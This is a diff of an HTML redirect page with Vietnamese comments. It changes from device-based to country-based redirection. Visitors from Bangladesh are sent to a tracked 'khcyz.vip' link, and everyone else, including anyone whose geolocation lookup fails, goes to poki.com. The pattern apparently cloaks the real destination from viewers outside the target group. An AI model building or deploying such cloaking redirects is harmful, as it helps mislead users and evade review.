@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Redirect...</title>
@@ -13,38 +13,54 @@
       width: 100%;
       height: 100%;
       overflow: hidden;
-      background: #000; /* hoặc #fff, tuỳ bạn */
+      background: #000; /* hoặc #fff tùy bạn */
     }
   </style>
 </head>
-
 <body>
   <script>
-    // Hàm phát hiện mobile / tablet
-    function isMobileOrTablet() {
-      var ua = navigator.userAgent || navigator.vendor || window.opera;
-      var mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i;
-      return mobileRegex.test(ua);
-    }
-
     // 🔗 ĐỔI LINK Ở ĐÂY:
-    // Trang A: máy tính / thiết bị văn phòng
-    const DESKTOP_URL = "https://poki.com/";
-    // Trang B: điện thoại, Android, iPhone, tablet
-    const MOBILE_URL  = "https://www.khcyz.vip/?ch=4f80366d81";
+    // Web A: cho user ở Bangladesh
+    const BD_URL  = "https://www.khcyz.vip/?ch=4f80366d81";  // TODO: sửa thành link A của bạn
+    // Web B: cho tất cả quốc gia khác
+    const OTHER_URL = "https://poki.com"; // TODO: sửa thành link B của bạn
 
     // Thời gian delay (ms): 1000 = 1s, 1500 = 1.5s, 2000 = 2s
-    var DELAY = 1500;
+    const DELAY = 1500;
 
-    setTimeout(function () {
-      if (isMobileOrTablet()) {
-        // Thiết bị di động → sang Web B
-        window.location.href = MOBILE_URL;
-      } else {
-        // Máy tính, laptop, thiết bị văn phòng → sang Web A
-        window.location.href = DESKTOP_URL;
-      }
-    }, DELAY);
+    // Gọi API lấy thông tin IP / country
+    // Ở đây dùng ipapi.co (free, không cần key cho mức cơ bản)
+    function detectCountryAndRedirect() {
+      fetch("https://ipapi.co/json/")
+        .then(function (res) {
+          return res.json();
+        })
+        .then(function (data) {
+          var countryCode = (data && data.country) ? String(data.country).toUpperCase() : "";
+
+          // Debug nếu cần: console.log(countryCode, data);
+
+          setTimeout(function () {
+            if (countryCode === "BD") {
+              // Nếu là Bangladesh → Web A
+              window.location.href = BD_URL;
+            } else {
+              // Các nước khác → Web B
+              window.location.href = OTHER_URL;
+            }
+          }, DELAY);
+        })
+        .catch(function (err) {
+          // Nếu lỗi API (không lấy được quốc gia) → cho sang Web B cho an toàn
+          // console.error(err);
+          setTimeout(function () {
+            window.location.href = OTHER_URL;
+          }, DELAY);
+        });
+    }
+
+    // Gọi ngay khi trang load
+    detectCountryAndRedirect();
   </script>
 </body>
 </html>
